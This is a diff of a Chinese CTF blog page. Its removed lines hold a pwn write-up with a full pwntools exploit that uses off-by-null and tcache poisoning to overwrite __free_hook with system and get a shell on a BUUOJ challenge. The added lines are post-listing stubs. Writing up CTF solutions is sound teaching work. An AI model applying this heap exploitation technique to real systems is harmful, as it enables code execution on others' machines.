-<p>但是我当时看了下bss段存储的数据，发现可以同时控制key1、key2和heap指针数组里的内容，就是申请到0x6021d0这个地址，这个地址位于heap[31]，我们先申请出来修改key1和key2的值，然后执行show函数拿到libc地址，再去往0x6021d0这个地址上写入free_hook的地址，最后编辑heap[31]这个块，写入system的地址即可。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x400DE2</span></span><br><span class="line">d_e=<span class="number">0x400DFA</span></span><br><span class="line">d_s=<span class="number">0x400E06</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27970&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">31</span>,<span class="number">0xf8</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xf0</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xf0</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)   </span><br><span class="line">    delete(<span class="number">7</span>) </span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    delete(<span class="number">9</span>)<span class="comment">#off by null，触发堆块合并</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将tcache bin给清空，给接下来的tcache poisoning做准备</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    edit(<span class="number">13</span>,p64(<span class="number">0x6021d0</span>))<span class="comment">#tcache poisoning</span></span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0xf0</span>,p64(<span class="number">0</span>)*<span class="number">29</span>+p32(<span class="number">1</span>)+p32(<span class="number">3</span>))<span class="comment">#修改两个key</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe0</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ebd90</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">15</span>,p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">    <span class="comment">#debug(p,d_a,d_d,d_e,d_s,0x400A25) </span></span><br><span class="line">    edit(<span class="number">31</span>,p64(sys_addr))</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+          <p>考察了off by null</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/f5fe6d2b.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
-<p><img src="/../img/2706180-20220906222614225-57262606.png"></p>
+    
+    
+    
 
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/d2d67d3f.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26's Blog">
+      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | ZIKH26's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/d2d67d3f.html" class="post-title-link" itemprop="url">ciscn_2019_final_4</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-07-01 20:00:54" itemprop="dateModified" datetime="2023-07-01T20:00:54+08:00">2023-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/buu%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">buu刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>buu刷题…</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/d2d67d3f.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/74f96fff.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26's Blog">
+      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | ZIKH26's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/74f96fff.html" class="post-title-link" itemprop="url">CATCTF2022_pwn复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-07-01 20:02:33" itemprop="dateModified" datetime="2023-07-01T20:02:33+08:00">2023-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>CATCTF2022 PWN赛题复现</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/74f96fff.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
